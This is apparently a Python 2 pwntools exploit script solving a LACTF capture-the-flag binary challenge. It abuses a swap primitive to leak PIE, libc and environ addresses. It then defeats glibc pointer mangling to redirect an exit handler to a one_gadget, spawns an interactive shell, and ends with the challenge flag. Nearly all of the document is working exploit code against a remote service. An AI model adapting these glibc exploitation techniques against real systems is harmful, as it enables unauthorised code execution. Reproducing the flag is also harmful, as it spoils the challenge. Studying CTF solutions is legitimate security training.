#!/usr/bin/env python2
#-*- coding: future_fstrings -*-

from pwn import *
MASK = 0xffffffffffffffff
context.log_level = "fatal"

def endian_change(x):
    return u64(p64(x), endian='big')
    
def swap(a, b):
    p.sendlineafter("woogie: ", str(a))
    p.sendlineafter("boogie: ", str(b))

    
def _swap(a, b):
    p.sendafter("woogie: ", a), sleep(0.1)
    p.sendafter("boogie: ", b), sleep(0.1)

dd = 0
while True:
    try:
        if dd != 0:
            print "FAIL......."
            break
        if 'remote' in os.environ:
            p = remote("chall.lac.tf", 31166)
        else:
            p = remote("172.17.0.2", 5000)

        swap(5, 12) # main's ret = _start
        swap(0, 9)
        swap(0, 0)
        leak = u64(p.recvline().strip(), endian="big")
        pie_base = (leak-0x12f5)
        # print "pie", hex(pie_base)

        swap(5, 12)
        swap(0, 21)
        swap(0, 0)
        leak = u64(p.recvline().strip(), endian="big")
        libc_base = (leak-0x823c6)
        system = 0x52290 + libc_base
        
        magic = libc_base + 0xe3afe
        """
        [r15] == NULL || r15 == NULL
        [r12] == NULL || r12 == NULL
        """
        # print "libc", hex(libc_base)
        # print "system", hex(system)
        # print "magic", hex(magic)
        print "magic", hex(magic), hex(magic & 0xf0f00000)
        if magic & 0xf0f00000:
            p.close()
            continue
    
        print("!!!!!!!!!!!!!!!!")
        dd = 1
        swap(5, 12)
        swap(0, 50)
        swap(0, 0)
        environ = u64(p.recvline().strip(), endian="big")
        # print "environ", hex(environ)

        mangle_key = (libc_base + 0x1f3570)
        exit1 = (libc_base + 0x1edcb8 + 0x60) # &initial's last entry
        # print "mangle key", hex(mangle_key)
        # print "exit1", hex(exit1)

        ptr = environ - 0x3b0
        swap(~(magic & 0xfffff), 1) # 0xfffff..fffffABCDE (lowest 20bit)
        swap(~(magic & 0xfffff), (mangle_key-ptr) // 8)

        vv = ((-endian_change(rol((0xffff0f000000 & magic) ^ MASK, 17, 64))) & MASK)
        # print "vv", hex(vv)
        if vv >= 0x100000: 
            continue
        
        swap(-vv, 1)
        swap(-vv, 0)
        swap(5, 9)
        swap(0, 0) 
        # -> exit -> 0x7fab?d?fffff ^ 0xfffffffffABCDE => one_gadget (0x7f??0?0?????)

        ptr = environ - 0x3a8
        swap(-1, (exit1-ptr) // 8) # get endian-swaped value (0x7fab?d?fffff)
        swap(5, 8)
        swap(0, 0)
        break
    except KeyboardInterrupt:
        p.close()
        break
    except:
        p.close()
        continue

# swap(3, 0)
# swap(5, 12) # main's ret

p.interactive()

# lactf{l1ne_buff3r1ng_1s_s0_us3ful!!}
